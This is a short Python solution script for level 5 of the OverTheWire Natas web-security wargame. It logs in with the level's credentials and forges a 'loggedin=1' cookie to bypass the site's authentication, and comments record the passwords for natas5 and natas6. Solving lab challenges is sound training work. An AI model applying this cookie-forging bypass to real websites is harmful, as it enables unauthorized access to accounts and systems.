#!/usr/bin/env python

#The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

import requests

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
siteUrl = 'http://{}.natas.labs.overthewire.org'.format(username)

def loginWebSite():
    content = requests.get(siteUrl, auth = (username, password))
    print(content.text)

def loginNextchallenge():
    import re

    cookies = {"loggedin": "1"}
    session = requests.Session()

    response = session.get(siteUrl, auth = (username, password), cookies = cookies)
    content = response.text

    print(session.cookies['loggedin'])
    print(content)


#loginWebSite()
loginNextchallenge()              #Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>